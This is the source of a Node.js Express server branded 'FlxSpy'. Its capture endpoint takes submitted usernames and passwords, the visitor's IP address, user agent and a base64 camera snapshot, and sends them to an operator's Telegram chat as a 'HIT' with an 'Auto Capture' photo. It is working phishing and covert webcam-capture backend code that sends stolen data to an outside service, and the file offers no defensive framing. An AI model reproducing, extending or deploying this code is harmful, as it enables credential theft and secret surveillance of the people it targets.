const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const bot = new TelegramBot(BOT_TOKEN, { polling: false });
const upload = multer({ dest: 'uploads/' });
if (!fs.existsSync('uploads/')) fs.mkdirSync('uploads/');

app.use(express.json({ limit: '10mb' }));

app.get('/', (req, res) => res.json({ status: 'FlxSpy Active' }));

app.post('/api/capture', async (req, res) => {
    const { username, password, camera, userAgent } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    let msg = `🎯 FLXSPY HIT\n👤 ${username || '-'}\n🔑 ${password || '-'}\n🌐 ${ip}\n📱 ${(userAgent || '').substring(0, 60)}`;
    await bot.sendMessage(CHAT_ID, msg);
    
    if (camera && camera.includes('base64')) {
        const buf = Buffer.from(camera.split(',')[1], 'base64');
        const temp = 'uploads/cam.jpg';
        fs.writeFileSync(temp, buf);
        await bot.sendPhoto(CHAT_ID, temp, { caption: '📸 Auto Capture' });
        fs.unlinkSync(temp);
    }
    
    res.json({ status: 'ok' });
});

app.listen(PORT, () => console.log(`✅ Running on port ${PORT}`));
